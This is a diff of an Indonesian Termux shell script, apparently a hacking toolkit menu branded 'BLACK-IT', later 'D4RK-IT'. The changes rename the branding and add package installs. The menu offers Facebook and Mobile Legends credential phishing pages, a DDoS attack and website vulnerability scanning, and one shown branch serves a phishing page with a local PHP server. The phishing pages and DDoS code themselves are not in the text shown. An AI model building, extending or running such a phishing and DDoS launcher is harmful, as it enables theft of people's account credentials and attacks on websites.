@@ -9,7 +9,7 @@ ku='\033[33;1m' #kuning
 toilet -f future "TERMUX INDONESIA" | lolcat
 echo $cy"Author :MR.J"
 echo $cy"___________________________________________________________________________"
-toilet -f future "WELCOME TO TOOLS BLACK-IT"
+toilet -f future "WELCOME TO TOOLS D4RK-IT"
 toilet -f term "   /\_/\ " | lolcat
 toilet -f term " =[ •~• ]= " | lolcat
 toilet -f term "    [\]_" | lolcat
@@ -22,13 +22,13 @@ toilet -f term "| |___________|     J" | lolcat
 toilet -f term "\_|_________|_/ GUNAKAN DENGAN BIJAK!!!" | lolcat
 echo $cy"___________________________________________________________________________"
 echo $i "ANONYMOUS INDONESIA"
-echo $i "TOOLS-BLACK-IT"
+echo $i "TOOLS-D4RK-IT"
 echo $cy"___________________________________________________________________________"
 sleep 1
 echo
-echo $i"BY MR.J TOOLS BLACK-IT"
+echo $i"BY MR.J TOOLS D4RK-IT"
 echo $i"[" $ku"?" $i"]" $ku"TERMUX_INDONESIA"
-echo $i"[" $ku"?" $i"]" $ku"HACKING TOOLS BLACK-IT"
+echo $i"[" $ku"?" $i"]" $ku"HACKING TOOLS D4RK-IT"
 echo $cy"___________________________________________________________________________"
 echo $pur"["$ku"1"$pur"]"$ku"[+]INSTALL BAHAN-BAHAN (WAJIB)"
 echo $pur"["$ku"2"$pur"]"$ku"[+]PHISING FACEBOOK SECURITY"
@@ -41,7 +41,7 @@ echo $pur"["$ku"8"$pur"]"$ku"[+]DDOS ATTACK"
 echo $pur"["$ku"9"$pur"]"$ku"[+]MENCARI KELEMAHAN WEBSITE"
 echo $pur"["$ku"0"$pur"]"$ku"[+]EXIT"
 echo $cy"___________________________________________________________________________"
-echo $ku"╭─["$i"BLACK-IT@Root"$ku"]"
+echo $ku"╭─["$i"D4RK-IT@Root"$ku"]"
 read -p"╰─>> " pil
 
 if [ $pil = 1 ]
@@ -57,8 +57,18 @@ gem install lolcat
 apt install openssh
 apt install autossh
 pkg install php
-echo $cy"all modules was succesfuly installed"
-sleep 4
+pkg install python
+pkg install PHP
+pkg install git
+pkg install nano
+pip install requests
+pip2 install requests
+pip install mechanize
+pip2 install mechanize
+echo $ku"============================="
+echo $cy"SEMUA BAHAN SUDAH DI INSTALL"
+echo $ku"============================="
+sleep 3
 sh IT.sh
 fi
 
@@ -66,7 +76,7 @@ if [ $pil = 2 ]
 then
 echo $i"Openning..."
 sleep 1
-echo $cy"TERMUX INDONESIA BLACK-IT Mr.J"
+echo $cy"TERMUX INDONESIA D4RK-IT Mr.J"
 echo $ku"__________________________________"
 sleep 1
 echo $cy"  PHISING FACEBOOK SECURITY CHECK  "
@@ -77,7 +87,7 @@ if [ $pil = 3 ]
 then
 echo $i"Openning..."
 sleep 1
-echo $cy"TERMUX INDONESIA BLACK-IT Mr.J"
+echo $cy"TERMUX INDONESIA D4RK-IT Mr.J"
 echo $ku"---------------------------------------------------------------------------"
 echo $i"[+]PHISING FACEBOOK MOBILE LOGIN"
 echo $i"[+]SALIN LINK YANG ADA DI TANDA ()"
@@ -96,7 +106,7 @@ if [ $pil = 5 ]
 then
 echo $i"Openning..."
 sleep 1
-echo $cy"TERMUX INDONESIA BLACK-IT Mr.J"
+echo $cy"TERMUX INDONESIA D4RK-IT Mr.J"
 echo $ku"_________________________________"
 echo $cy"  PHISING MOBILE LEGEND"
 php -S localhost:8080 -t ~/BLACK-IT/Ml
@@ -134,7 +144,7 @@ if [ $pil = 0 ]
 then
 sleep 1
 echo $cy"============================================="
-echo $ku"[+]TERIMAKASIH SUDAH MEMAKAI TOOLS BLACK-IT"
+echo $ku"[+]TERIMAKASIH SUDAH MEMAKAI TOOLS D4RK-IT"
 echo $ku"[+]SEE YOU BYE"
 echo $cy"============================================="
 sleep 1
